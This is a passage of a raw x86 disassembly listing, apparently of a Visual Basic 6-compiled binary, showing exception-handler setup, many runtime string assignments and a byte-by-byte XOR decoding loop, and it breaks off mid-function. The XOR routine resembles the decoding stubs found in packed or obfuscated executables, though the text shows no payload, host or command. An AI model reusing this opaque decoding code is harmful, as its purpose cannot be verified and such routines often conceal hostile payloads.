  404b6c:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404b6f:	ff 15 0c 10 40 00    	call   *0x40100c
  404b75:	68 be 4b 40 00       	push   $0x404bbe
  404b7a:	eb 25                	jmp    0x404ba1
  404b7c:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  404b80:	74 09                	je     0x404b8b
  404b82:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404b85:	ff 15 1c 10 40 00    	call   *0x40101c
  404b8b:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404b8e:	ff 15 1c 10 40 00    	call   *0x40101c
  404b94:	8d 55 bc             	lea    -0x44(%ebp),%edx
  404b97:	52                   	push   %edx
  404b98:	6a 00                	push   $0x0
  404b9a:	ff 15 50 10 40 00    	call   *0x401050
  404ba0:	c3                   	ret
  404ba1:	8b 35 a0 11 40 00    	mov    0x4011a0,%esi
  404ba7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404baa:	ff d6                	call   *%esi
  404bac:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404baf:	50                   	push   %eax
  404bb0:	6a 00                	push   $0x0
  404bb2:	ff 15 50 10 40 00    	call   *0x401050
  404bb8:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  404bbb:	ff d6                	call   *%esi
  404bbd:	c3                   	ret
  404bbe:	8b 45 08             	mov    0x8(%ebp),%eax
  404bc1:	8b 55 d0             	mov    -0x30(%ebp),%edx
  404bc4:	8b c8                	mov    %eax,%ecx
  404bc6:	5f                   	pop    %edi
  404bc7:	5e                   	pop    %esi
  404bc8:	5b                   	pop    %ebx
  404bc9:	89 11                	mov    %edx,(%ecx)
  404bcb:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404bce:	89 51 04             	mov    %edx,0x4(%ecx)
  404bd1:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404bd4:	89 51 08             	mov    %edx,0x8(%ecx)
  404bd7:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404bda:	89 51 0c             	mov    %edx,0xc(%ecx)
  404bdd:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404be0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404be7:	8b e5                	mov    %ebp,%esp
  404be9:	5d                   	pop    %ebp
  404bea:	c2 0c 00             	ret    $0xc
  404bed:	90                   	nop
  404bee:	90                   	nop
  404bef:	90                   	nop
  404bf0:	55                   	push   %ebp
  404bf1:	8b ec                	mov    %esp,%ebp
  404bf3:	83 ec 08             	sub    $0x8,%esp
  404bf6:	68 66 12 40 00       	push   $0x401266
  404bfb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404c01:	50                   	push   %eax
  404c02:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404c09:	81 ec 14 02 00 00    	sub    $0x214,%esp
  404c0f:	53                   	push   %ebx
  404c10:	56                   	push   %esi
  404c11:	57                   	push   %edi
  404c12:	89 65 f8             	mov    %esp,-0x8(%ebp)
  404c15:	c7 45 fc 38 12 40 00 	movl   $0x401238,-0x4(%ebp)
  404c1c:	8b 55 0c             	mov    0xc(%ebp),%edx
  404c1f:	33 c0                	xor    %eax,%eax
  404c21:	8d 8d 64 fe ff ff    	lea    -0x19c(%ebp),%ecx
  404c27:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404c2a:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404c2d:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404c30:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  404c33:	89 45 90             	mov    %eax,-0x70(%ebp)
  404c36:	89 45 80             	mov    %eax,-0x80(%ebp)
  404c39:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  404c3f:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  404c45:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  404c4b:	89 85 3c ff ff ff    	mov    %eax,-0xc4(%ebp)
  404c51:	89 85 2c ff ff ff    	mov    %eax,-0xd4(%ebp)
  404c57:	89 85 1c ff ff ff    	mov    %eax,-0xe4(%ebp)
  404c5d:	89 85 0c ff ff ff    	mov    %eax,-0xf4(%ebp)
  404c63:	89 85 fc fe ff ff    	mov    %eax,-0x104(%ebp)
  404c69:	89 85 ec fe ff ff    	mov    %eax,-0x114(%ebp)
  404c6f:	89 85 dc fe ff ff    	mov    %eax,-0x124(%ebp)
  404c75:	89 85 cc fe ff ff    	mov    %eax,-0x134(%ebp)
  404c7b:	89 85 bc fe ff ff    	mov    %eax,-0x144(%ebp)
  404c81:	89 85 ac fe ff ff    	mov    %eax,-0x154(%ebp)
  404c87:	89 85 9c fe ff ff    	mov    %eax,-0x164(%ebp)
  404c8d:	89 85 8c fe ff ff    	mov    %eax,-0x174(%ebp)
  404c93:	89 85 7c fe ff ff    	mov    %eax,-0x184(%ebp)
  404c99:	89 85 68 fe ff ff    	mov    %eax,-0x198(%ebp)
  404c9f:	89 85 64 fe ff ff    	mov    %eax,-0x19c(%ebp)
  404ca5:	89 85 54 fe ff ff    	mov    %eax,-0x1ac(%ebp)
  404cab:	89 85 44 fe ff ff    	mov    %eax,-0x1bc(%ebp)
  404cb1:	89 85 40 fe ff ff    	mov    %eax,-0x1c0(%ebp)
  404cb7:	89 85 3c fe ff ff    	mov    %eax,-0x1c4(%ebp)
  404cbd:	89 85 38 fe ff ff    	mov    %eax,-0x1c8(%ebp)
  404cc3:	89 85 34 fe ff ff    	mov    %eax,-0x1cc(%ebp)
  404cc9:	89 85 30 fe ff ff    	mov    %eax,-0x1d0(%ebp)
  404ccf:	89 85 2c fe ff ff    	mov    %eax,-0x1d4(%ebp)
  404cd5:	89 85 28 fe ff ff    	mov    %eax,-0x1d8(%ebp)
  404cdb:	89 85 18 fe ff ff    	mov    %eax,-0x1e8(%ebp)
  404ce1:	89 85 08 fe ff ff    	mov    %eax,-0x1f8(%ebp)
  404ce7:	ff 15 30 11 40 00    	call   *0x401130
  404ced:	8b 35 6c 11 40 00    	mov    0x40116c,%esi
  404cf3:	bf 08 00 00 00       	mov    $0x8,%edi
  404cf8:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404cfe:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  404d04:	c7 85 10 fe ff ff 68 	movl   $0x404068,-0x1f0(%ebp)
  404d0b:	40 40 00 
  404d0e:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404d14:	ff d6                	call   *%esi
  404d16:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404d1c:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  404d22:	c7 85 10 fe ff ff 28 	movl   $0x404028,-0x1f0(%ebp)
  404d29:	40 40 00 
  404d2c:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404d32:	ff d6                	call   *%esi
  404d34:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404d3a:	8d 8d 7c fe ff ff    	lea    -0x184(%ebp),%ecx
  404d40:	c7 85 10 fe ff ff 78 	movl   $0x404078,-0x1f0(%ebp)
  404d47:	40 40 00 
  404d4a:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404d50:	ff d6                	call   *%esi
  404d52:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404d58:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  404d5e:	c7 85 10 fe ff ff 18 	movl   $0x404018,-0x1f0(%ebp)
  404d65:	40 40 00 
  404d68:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404d6e:	ff d6                	call   *%esi
  404d70:	bb 4c 40 40 00       	mov    $0x40404c,%ebx
  404d75:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404d7b:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404d7e:	89 9d 10 fe ff ff    	mov    %ebx,-0x1f0(%ebp)
  404d84:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404d8a:	ff d6                	call   *%esi
  404d8c:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404d92:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404d95:	89 9d 10 fe ff ff    	mov    %ebx,-0x1f0(%ebp)
  404d9b:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404da1:	ff d6                	call   *%esi
  404da3:	c7 85 10 fe ff ff 18 	movl   $0x404018,-0x1f0(%ebp)
  404daa:	40 40 00 
  404dad:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404db3:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404db9:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  404dbf:	ff d6                	call   *%esi
  404dc1:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404dc7:	8d 8d 7c fe ff ff    	lea    -0x184(%ebp),%ecx
  404dcd:	c7 85 10 fe ff ff 78 	movl   $0x404078,-0x1f0(%ebp)
  404dd4:	40 40 00 
  404dd7:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404ddd:	ff d6                	call   *%esi
  404ddf:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404de5:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  404deb:	c7 85 10 fe ff ff 28 	movl   $0x404028,-0x1f0(%ebp)
  404df2:	40 40 00 
  404df5:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404dfb:	ff d6                	call   *%esi
  404dfd:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404e03:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  404e09:	c7 85 10 fe ff ff 68 	movl   $0x404068,-0x1f0(%ebp)
  404e10:	40 40 00 
  404e13:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404e19:	ff d6                	call   *%esi
  404e1b:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404e21:	8d 8d 8c fe ff ff    	lea    -0x174(%ebp),%ecx
  404e27:	c7 85 10 fe ff ff 8c 	movl   $0x40408c,-0x1f0(%ebp)
  404e2e:	40 40 00 
  404e31:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404e37:	ff d6                	call   *%esi
  404e39:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404e3f:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  404e45:	c7 85 10 fe ff ff a4 	movl   $0x4040a4,-0x1f0(%ebp)
  404e4c:	40 40 00 
  404e4f:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404e55:	ff d6                	call   *%esi
  404e57:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404e5d:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  404e60:	c7 85 10 fe ff ff c0 	movl   $0x4040c0,-0x1f0(%ebp)
  404e67:	40 40 00 
  404e6a:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404e70:	ff d6                	call   *%esi
  404e72:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404e78:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  404e7e:	c7 85 10 fe ff ff ec 	movl   $0x4040ec,-0x1f0(%ebp)
  404e85:	40 40 00 
  404e88:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404e8e:	ff d6                	call   *%esi
  404e90:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404e96:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  404e9c:	c7 85 10 fe ff ff dc 	movl   $0x4040dc,-0x1f0(%ebp)
  404ea3:	40 40 00 
  404ea6:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404eac:	ff d6                	call   *%esi
  404eae:	8b 85 64 fe ff ff    	mov    -0x19c(%ebp),%eax
  404eb4:	50                   	push   %eax
  404eb5:	ff 15 24 10 40 00    	call   *0x401024
  404ebb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404ebe:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  404ec4:	8b 19                	mov    (%ecx),%ebx
  404ec6:	53                   	push   %ebx
  404ec7:	6a 01                	push   $0x1
  404ec9:	ff 15 ac 10 40 00    	call   *0x4010ac
  404ecf:	53                   	push   %ebx
  404ed0:	6a 01                	push   $0x1
  404ed2:	89 45 a0             	mov    %eax,-0x60(%ebp)
  404ed5:	ff 15 fc 10 40 00    	call   *0x4010fc
  404edb:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404ee1:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  404ee7:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404eea:	c7 85 10 fe ff ff dc 	movl   $0x4040dc,-0x1f0(%ebp)
  404ef1:	40 40 00 
  404ef4:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404efa:	ff d6                	call   *%esi
  404efc:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404f02:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  404f08:	c7 85 10 fe ff ff ec 	movl   $0x4040ec,-0x1f0(%ebp)
  404f0f:	40 40 00 
  404f12:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404f18:	ff d6                	call   *%esi
  404f1a:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404f20:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  404f23:	c7 85 10 fe ff ff c0 	movl   $0x4040c0,-0x1f0(%ebp)
  404f2a:	40 40 00 
  404f2d:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404f33:	ff d6                	call   *%esi
  404f35:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404f3b:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  404f41:	c7 85 10 fe ff ff a4 	movl   $0x4040a4,-0x1f0(%ebp)
  404f48:	40 40 00 
  404f4b:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404f51:	ff d6                	call   *%esi
  404f53:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404f59:	8d 8d 8c fe ff ff    	lea    -0x174(%ebp),%ecx
  404f5f:	c7 85 10 fe ff ff 8c 	movl   $0x40408c,-0x1f0(%ebp)
  404f66:	40 40 00 
  404f69:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404f6f:	ff d6                	call   *%esi
  404f71:	6a 31                	push   $0x31
  404f73:	ff 15 08 11 40 00    	call   *0x401108
  404f79:	8b 1d 84 11 40 00    	mov    0x401184,%ebx
  404f7f:	8b d0                	mov    %eax,%edx
  404f81:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  404f87:	ff d3                	call   *%ebx
  404f89:	50                   	push   %eax
  404f8a:	ff 15 34 11 40 00    	call   *0x401134
  404f90:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  404f96:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  404f99:	ff 15 a0 11 40 00    	call   *0x4011a0
  404f9f:	8b 95 6c ff ff ff    	mov    -0x94(%ebp),%edx
  404fa5:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  404fa8:	3b c2                	cmp    %edx,%eax
  404faa:	0f 8f 26 06 00 00    	jg     0x4055d6
  404fb0:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404fb6:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  404fbc:	c7 85 10 fe ff ff 88 	movl   $0x403f88,-0x1f0(%ebp)
  404fc3:	3f 40 00 
  404fc6:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404fcc:	ff d6                	call   *%esi
  404fce:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404fd4:	8d 8d 44 fe ff ff    	lea    -0x1bc(%ebp),%ecx
  404fda:	c7 85 10 fe ff ff fc 	movl   $0x4040fc,-0x1f0(%ebp)
  404fe1:	40 40 00 
  404fe4:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  404fea:	ff d6                	call   *%esi
  404fec:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  404ff2:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  404ff8:	c7 85 10 fe ff ff 98 	movl   $0x403f98,-0x1f0(%ebp)
  404fff:	3f 40 00 
  405002:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405008:	ff d6                	call   *%esi
  40500a:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  405010:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  405013:	c7 85 10 fe ff ff 0c 	movl   $0x40410c,-0x1f0(%ebp)
  40501a:	41 40 00 
  40501d:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405023:	ff d6                	call   *%esi
  405025:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  40502b:	8d 8d ac fe ff ff    	lea    -0x154(%ebp),%ecx
  405031:	c7 85 10 fe ff ff 20 	movl   $0x404120,-0x1f0(%ebp)
  405038:	41 40 00 
  40503b:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405041:	ff d6                	call   *%esi
  405043:	6a 31                	push   $0x31
  405045:	ff 15 08 11 40 00    	call   *0x401108
  40504b:	8b d0                	mov    %eax,%edx
  40504d:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  405053:	ff d3                	call   *%ebx
  405055:	50                   	push   %eax
  405056:	ff 15 34 11 40 00    	call   *0x401134
  40505c:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  40505f:	8b 95 64 fe ff ff    	mov    -0x19c(%ebp),%edx
  405065:	89 85 20 fe ff ff    	mov    %eax,-0x1e0(%ebp)
  40506b:	8d 85 18 fe ff ff    	lea    -0x1e8(%ebp),%eax
  405071:	50                   	push   %eax
  405072:	51                   	push   %ecx
  405073:	52                   	push   %edx
  405074:	c7 85 18 fe ff ff 03 	movl   $0x3,-0x1e8(%ebp)
  40507b:	00 00 00 
  40507e:	ff 15 7c 10 40 00    	call   *0x40107c
  405084:	8b d0                	mov    %eax,%edx
  405086:	8d 8d 3c fe ff ff    	lea    -0x1c4(%ebp),%ecx
  40508c:	ff d3                	call   *%ebx
  40508e:	50                   	push   %eax
  40508f:	ff 15 30 10 40 00    	call   *0x401030
  405095:	66 8b c8             	mov    %ax,%cx
  405098:	81 f1 ff 00 00 00    	xor    $0xff,%ecx
  40509e:	ff 15 bc 10 40 00    	call   *0x4010bc
  4050a4:	88 85 78 fe ff ff    	mov    %al,-0x188(%ebp)
  4050aa:	8d 85 3c fe ff ff    	lea    -0x1c4(%ebp),%eax
  4050b0:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  4050b6:	50                   	push   %eax
  4050b7:	51                   	push   %ecx
  4050b8:	6a 02                	push   $0x2
  4050ba:	ff 15 38 11 40 00    	call   *0x401138
  4050c0:	83 c4 0c             	add    $0xc,%esp
  4050c3:	8d 8d 18 fe ff ff    	lea    -0x1e8(%ebp),%ecx
  4050c9:	ff 15 1c 10 40 00    	call   *0x40101c
  4050cf:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4050d5:	8d 8d ac fe ff ff    	lea    -0x154(%ebp),%ecx
  4050db:	c7 85 10 fe ff ff 20 	movl   $0x404120,-0x1f0(%ebp)
  4050e2:	41 40 00 
  4050e5:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4050eb:	ff d6                	call   *%esi
  4050ed:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4050f3:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  4050f6:	c7 85 10 fe ff ff 0c 	movl   $0x40410c,-0x1f0(%ebp)
  4050fd:	41 40 00 
  405100:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405106:	ff d6                	call   *%esi
  405108:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  40510e:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  405114:	c7 85 10 fe ff ff 98 	movl   $0x403f98,-0x1f0(%ebp)
  40511b:	3f 40 00 
  40511e:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405124:	ff d6                	call   *%esi
  405126:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  40512c:	8d 8d 44 fe ff ff    	lea    -0x1bc(%ebp),%ecx
  405132:	c7 85 10 fe ff ff fc 	movl   $0x4040fc,-0x1f0(%ebp)
  405139:	40 40 00 
  40513c:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405142:	ff d6                	call   *%esi
  405144:	c7 85 10 fe ff ff 88 	movl   $0x403f88,-0x1f0(%ebp)
  40514b:	3f 40 00 
  40514e:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405154:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  40515a:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  405160:	ff d6                	call   *%esi
  405162:	8b 55 a0             	mov    -0x60(%ebp),%edx
  405165:	89 55 d8             	mov    %edx,-0x28(%ebp)
  405168:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  40516e:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405171:	c1 f8 1f             	sar    $0x1f,%eax
  405174:	8b c8                	mov    %eax,%ecx
  405176:	33 ca                	xor    %edx,%ecx
  405178:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40517b:	33 c2                	xor    %edx,%eax
  40517d:	3b c1                	cmp    %ecx,%eax
  40517f:	0f 8f e6 02 00 00    	jg     0x40546b
  405185:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  40518b:	8d 8d bc fe ff ff    	lea    -0x144(%ebp),%ecx
  405191:	c7 85 10 fe ff ff fc 	movl   $0x403efc,-0x1f0(%ebp)
  405198:	3e 40 00 
  40519b:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4051a1:	ff d6                	call   *%esi
  4051a3:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4051a9:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4051ac:	c7 85 10 fe ff ff 34 	movl   $0x404134,-0x1f0(%ebp)
  4051b3:	41 40 00 
  4051b6:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4051bc:	ff d6                	call   *%esi
  4051be:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4051c4:	8d 8d 9c fe ff ff    	lea    -0x164(%ebp),%ecx
  4051ca:	c7 85 10 fe ff ff 34 	movl   $0x403b34,-0x1f0(%ebp)
  4051d1:	3b 40 00 
  4051d4:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4051da:	ff d6                	call   *%esi
  4051dc:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  4051e2:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  4051e8:	c7 85 10 fe ff ff dc 	movl   $0x403cdc,-0x1f0(%ebp)
  4051ef:	3c 40 00 
  4051f2:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  4051f8:	ff d6                	call   *%esi
  4051fa:	8d 95 08 fe ff ff    	lea    -0x1f8(%ebp),%edx
  405200:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  405206:	c7 85 10 fe ff ff e8 	movl   $0x403ce8,-0x1f0(%ebp)
  40520d:	3c 40 00 
  405210:	89 bd 08 fe ff ff    	mov    %edi,-0x1f8(%ebp)
  405216:	ff d6                	call   *%esi
  405218:	8b 55 08             	mov    0x8(%ebp),%edx
  40521b:	8b 02                	mov    (%edx),%eax
  40521d:	85 c0                	test   %eax,%eax
  40521f:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  405225:	74 35                	je     0x40525c
  405227:	66 83 38 01          	cmpw   $0x1,(%eax)
  40522b:	75 2f                	jne    0x40525c
  40522d:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  405230:	8b 50 14             	mov    0x14(%eax),%edx
  405233:	2b ca                	sub    %edx,%ecx
  405235:	8b 50 10             	mov    0x10(%eax),%edx
  405238:	3b ca                	cmp    %edx,%ecx
  40523a:	89 8d 00 fe ff ff    	mov    %ecx,-0x200(%ebp)
  405240:	72 12                	jb     0x405254
  405242:	ff 15 90 10 40 00    	call   *0x401090
  405248:	8b 85 e8 fd ff ff    	mov    -0x218(%ebp),%eax
  40524e:	8b 8d 00 fe ff ff    	mov    -0x200(%ebp),%ecx
  405254:	89 8d e4 fd ff ff    	mov    %ecx,-0x21c(%ebp)
  40525a:	eb 12                	jmp    0x40526e
  40525c:	ff 15 90 10 40 00    	call   *0x401090
  405262:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  405268:	8b 85 e8 fd ff ff    	mov    -0x218(%ebp),%eax
  40526e:	85 c0                	test   %eax,%eax
  405270:	74 35                	je     0x4052a7
  405272:	66 83 38 01          	cmpw   $0x1,(%eax)
  405276:	75 2f                	jne    0x4052a7
  405278:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40527b:	8b 50 14             	mov    0x14(%eax),%edx
  40527e:	2b ca                	sub    %edx,%ecx
  405280:	8b 50 10             	mov    0x10(%eax),%edx
  405283:	3b ca                	cmp    %edx,%ecx
  405285:	89 8d 04 fe ff ff    	mov    %ecx,-0x1fc(%ebp)
  40528b:	72 12                	jb     0x40529f
  40528d:	ff 15 90 10 40 00    	call   *0x401090
  405293:	8b 85 e8 fd ff ff    	mov    -0x218(%ebp),%eax
  405299:	8b 8d 04 fe ff ff    	mov    -0x1fc(%ebp),%ecx
  40529f:	89 8d e0 fd ff ff    	mov    %ecx,-0x220(%ebp)
  4052a5:	eb 12                	jmp    0x4052b9
  4052a7:	ff 15 90 10 40 00    	call   *0x401090
  4052ad:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  4052b3:	8b 85 e8 fd ff ff    	mov    -0x218(%ebp),%eax
  4052b9:	8b 40 0c             	mov    0xc(%eax),%eax
  4052bc:	6a 26                	push   $0x26
  4052be:	89 85 dc fd ff ff    	mov    %eax,-0x224(%ebp)
  4052c4:	ff 15 08 11 40 00    	call   *0x401108
  4052ca:	8b d0                	mov    %eax,%edx
  4052cc:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  4052d2:	ff d3                	call   *%ebx
  4052d4:	50                   	push   %eax
  4052d5:	6a 48                	push   $0x48
  4052d7:	ff 15 08 11 40 00    	call   *0x401108
  4052dd:	8b d0                	mov    %eax,%edx
  4052df:	8d 8d 3c fe ff ff    	lea    -0x1c4(%ebp),%ecx
  4052e5:	ff d3                	call   *%ebx
  4052e7:	50                   	push   %eax
  4052e8:	ff 15 3c 10 40 00    	call   *0x40103c
  4052ee:	8b d0                	mov    %eax,%edx
  4052f0:	8d 8d 38 fe ff ff    	lea    -0x1c8(%ebp),%ecx
  4052f6:	ff d3                	call   *%ebx
  4052f8:	50                   	push   %eax
  4052f9:	6a 46                	push   $0x46
  4052fb:	ff 15 08 11 40 00    	call   *0x401108
  405301:	8b d0                	mov    %eax,%edx
  405303:	8d 8d 34 fe ff ff    	lea    -0x1cc(%ebp),%ecx
  405309:	ff d3                	call   *%ebx
  40530b:	50                   	push   %eax
  40530c:	ff 15 3c 10 40 00    	call   *0x40103c
  405312:	8b d0                	mov    %eax,%edx
  405314:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  40531a:	ff d3                	call   *%ebx
  40531c:	50                   	push   %eax
  40531d:	6a 46                	push   $0x46
  40531f:	ff 15 08 11 40 00    	call   *0x401108
  405325:	8b d0                	mov    %eax,%edx
  405327:	8d 8d 2c fe ff ff    	lea    -0x1d4(%ebp),%ecx
  40532d:	ff d3                	call   *%ebx
  40532f:	50                   	push   %eax
  405330:	ff 15 3c 10 40 00    	call   *0x40103c
  405336:	8b d0                	mov    %eax,%edx
  405338:	8d 8d 28 fe ff ff    	lea    -0x1d8(%ebp),%ecx
  40533e:	ff d3                	call   *%ebx
  405340:	50                   	push   %eax
  405341:	ff 15 34 11 40 00    	call   *0x401134
  405347:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40534a:	8b 9d dc fd ff ff    	mov    -0x224(%ebp),%ebx
  405350:	8b c8                	mov    %eax,%ecx
  405352:	8b 85 e4 fd ff ff    	mov    -0x21c(%ebp),%eax
  405358:	23 ca                	and    %edx,%ecx
  40535a:	33 d2                	xor    %edx,%edx
  40535c:	8a 14 03             	mov    (%ebx,%eax,1),%dl
  40535f:	8b 85 78 fe ff ff    	mov    -0x188(%ebp),%eax
  405365:	25 ff 00 00 00       	and    $0xff,%eax
  40536a:	33 d0                	xor    %eax,%edx
  40536c:	33 ca                	xor    %edx,%ecx
  40536e:	ff 15 cc 10 40 00    	call   *0x4010cc
  405374:	8b 8d e0 fd ff ff    	mov    -0x220(%ebp),%ecx
  40537a:	8d 95 28 fe ff ff    	lea    -0x1d8(%ebp),%edx
  405380:	52                   	push   %edx
  405381:	8d 95 34 fe ff ff    	lea    -0x1cc(%ebp),%edx
